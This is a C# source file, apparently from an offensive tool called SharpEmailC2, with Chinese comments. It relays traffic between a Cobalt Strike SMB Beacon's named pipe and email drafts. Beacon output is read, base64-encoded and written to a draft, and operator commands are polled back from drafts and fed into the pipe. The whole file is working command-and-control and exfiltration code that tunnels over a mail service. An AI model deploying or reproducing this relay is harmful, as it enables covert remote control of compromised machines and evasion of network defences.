using SharpEmailC2;
using System;
using System.IO;
using System.IO.Pipes;
using System.Threading;

namespace SharpEmailC2
{
    public class pipeOptions : IConnectBeaconPipe
    {
        /// <summary>
        /// 由于命名管道已经创建，因此只需要连接该句柄，对其进行写入及读取即可。
        /// </summary>
        /// <param name="pipeName">SMB Beacon 命名管道</param>
        public void ConnectBeaconPipe(string pipeName, string UUID, int code)
        {
            Console.WriteLine("[+] Connecting to " + pipeName);
            using (var pipeClient = new NamedPipeClientStream("localhost", pipeName, PipeDirection.InOut))
            {
                pipeClient.Connect(5000);
                pipeClient.ReadMode = PipeTransmissionMode.Message;
                Console.WriteLine("[+] Connection established succesfully.");
                //bool isFirstLoop = false;
                //int code = 1;
                do
                {
                    // 读取管道
                    var result = GetDataToPipe(pipeClient);
                    // 向 CS 发送数据
                    Console.WriteLine("[+] 发送管道数据到ts" + Convert.ToBase64String(result));
                    DraftsIO.Write("client" + UUID, Convert.ToBase64String(result), code);
                    Thread.Sleep(5000);
                    // 接收 CS 发来的数据
                    int retryCount = 0;
                    int maxRetries = 100;

                    while (retryCount < maxRetries)
                    {
                        try
                        {
                            string res = DraftsIO.Read("ts" + UUID);
                            //由于延时的原因需要排除Payload的干扰，也可以去掉!res.StartsWith("TVpBUlVI") &&，在上面延时中的5s延长至20s
                            if (!res.StartsWith("TVpBUlVI") && res != null)
                            {
                                Console.WriteLine("[+] 获取到ts数据传入管道" + res);
                                var response = Convert.FromBase64String(res);
                                SendDataToPipe(response, pipeClient);
                                Thread.Sleep(1000);
                                break;
                            }
                        }
                        catch (Exception e)
                        {
                            // 在catch块中捕获异常
                            // 可以在这里记录日志或执行其他处理逻辑

                            retryCount++;

                            if (retryCount >= maxRetries)
                            {
                                Console.WriteLine("[!] Error: {0}", e.Message);
                            }
                            Console.WriteLine("[!] 获取Payload后建立连接重试" + retryCount);
                            // 等待一段时间后继续重试
                            Thread.Sleep(1000); // 可以根据需要调整等待时间
                        }
                    }
                    code = 0;
                } while (true);
            }
        }

        /// <summary>
        /// 读取管道
        /// </summary>
        /// <param name="pipeClient"> SMB Beacon 命名管道句柄</param>
        /// <returns></returns>
        private static Byte[] GetDataToPipe(NamedPipeClientStream pipeClient)
        {
            var reader = new BinaryReader(pipeClient);
            var totalSize = reader.ReadInt32(); // 读取总数据大小
            var result = new byte[totalSize];
            //var blockSize = 65536; // 每个块的大小为 64 KB
            var blockSize = 10000;

            for (int offset = 0; offset < totalSize; offset += blockSize)
            {
                var remainingSize = Math.Min(blockSize, totalSize - offset);
                var buffer = reader.ReadBytes(remainingSize); // 逐块读取数据
                Buffer.BlockCopy(buffer, 0, result, offset, buffer.Length);
            }

            return result;
        }

        /// <summary>
        /// 写入管道
        /// </summary>
        /// <param name="response">从 CS 获取到的指令</param>
        /// <param name="pipeClient">SMB Beacon 命名管道句柄</param>
        private static void SendDataToPipe(Byte[] response, NamedPipeClientStream pipeClient)
        {
            //var blockSize = 65536; // 每个块的大小为 64 KB
            var blockSize = 10000;
            var totalSize = response.Length;
            var writer = new BinaryWriter(pipeClient);

            writer.Write(totalSize); // 写入总数据大小

            for (int offset = 0; offset < totalSize; offset += blockSize)
            {
                var remainingSize = Math.Min(blockSize, totalSize - offset);
                writer.Write(response, offset, remainingSize); // 逐块写入数据
            }
        }

    }
}